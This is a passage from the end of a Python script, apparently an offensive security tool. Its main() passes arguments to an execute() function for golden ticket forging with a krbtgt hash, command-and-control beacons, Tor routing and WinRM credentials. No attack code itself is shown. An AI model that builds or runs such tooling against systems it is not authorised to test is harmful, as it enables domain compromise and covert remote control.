            gt_command=args.gt_command,
            c2_server=args.c2_server,
            c2_host=args.c2_host,
            c2_port=args.c2_port,
            c2_ssl=args.c2_ssl,
            c2_cert=args.c2_cert,
            c2_key=args.c2_key,
            c2_beacon=args.c2_beacon,
            c2_beacon_host=args.c2_beacon_host,
            c2_beacon_port=args.c2_beacon_port,
            c2_beacon_ssl=args.c2_beacon_ssl,
            silver_c2=args.silver_c2,
            silver_c2_host=args.silver_c2_host,
            silver_c2_port=args.silver_c2_port,
            silver_c2_domain=args.silver_c2_domain,
            gui=True
        )
    else:
        logger.info("Starting in CLI mode")
        execute(
            target=args.url,
            ldap_subnet=args.ldap_subnet,
            use_tor=args.tor,
            tor_pass=args.tor_pass,
            use_burp=args.burp,
            winrm_user=args.winrm_user,
            winrm_pass=args.winrm_pass,
            pfx_path=args.pfx_path,
            pfx_password=args.pfx_password,
            golden_ticket=args.golden_ticket,
            gt_domain=args.gt_domain,
            gt_user=args.gt_user,
            gt_krbtgt_hash=args.gt_krbtgt_hash,
            gt_sid=args.gt_sid,
            gt_dc_ip=args.gt_dc_ip,
            gt_lifetime=args.gt_lifetime,
            gt_target=args.gt_target,
            gt_command=args.gt_command,
            c2_server=args.c2_server,
            c2_host=args.c2_host,
            c2_port=args.c2_port,
            c2_ssl=args.c2_ssl,
            c2_cert=args.c2_cert,
            c2_key=args.c2_key,
            c2_beacon=args.c2_beacon,
            c2_beacon_host=args.c2_beacon_host,
            c2_beacon_port=args.c2_beacon_port,
            c2_beacon_ssl=args.c2_beacon_ssl,
            silver_c2=args.silver_c2,
            silver_c2_host=args.silver_c2_host,
            silver_c2_port=args.silver_c2_port,
            silver_c2_domain=args.silver_c2_domain,
            gui=False
        )

if __name__ == "__main__":
    main()
